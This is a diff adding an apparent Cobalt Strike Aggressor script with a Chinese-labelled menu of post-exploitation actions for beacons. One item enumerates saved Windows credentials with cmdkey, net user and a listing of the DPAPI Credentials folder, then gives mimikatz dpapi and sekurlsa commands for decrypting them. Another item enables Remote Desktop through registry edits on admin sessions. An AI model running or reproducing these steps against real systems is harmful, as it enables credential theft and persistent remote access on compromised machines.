@@ -1,0 +1,42 @@
+menu "辅助功能" {
+	item "获取远程连接主机的密码" {
+			show_message("没有管理员权限不能够获取到加密的密钥");
+			binput($1,"shell cmdkey /list");
+			bshell($1,"cmdkey /list");
+			blog($1,"查看有无保存的凭据");
+			binput($1,"shell net user");
+			bshell($1,"net user");
+			blog($1,"查看有多少用户,因为有时候凭据保存不是在管理元用户中");
+			binput($1,"shell dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\*");
+			bshell($1,"dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\*");
+			blog($1,"查看本地保存的证书");
+			show_message("mimikatz dpapi::cred /in:路径获取到guidMasterKey\n再利用mimikatz sekurlsa::dpapi获取到对应guidMasterkey的MasterKey\n最后使用mimikatz dpapi::cred /in:路径 /MasterKey:xxx");
+	}
+
+
+	item "开启远程桌面" {
+	if( -isadmin $1['@'] )
+	{
+		bshell($1,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+		bshell($1,"REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f");
+	}
+	else
+	{
+		show_error("Permission Denied!");
+	}
+
+	}
+
+	item "测试" {
+		if( -isadmin $1['@'])
+		{
+			show_message("admin!");
+		}
+		else
+		{
+			show_message("admin?");
+		}
+
+	}
+}
+
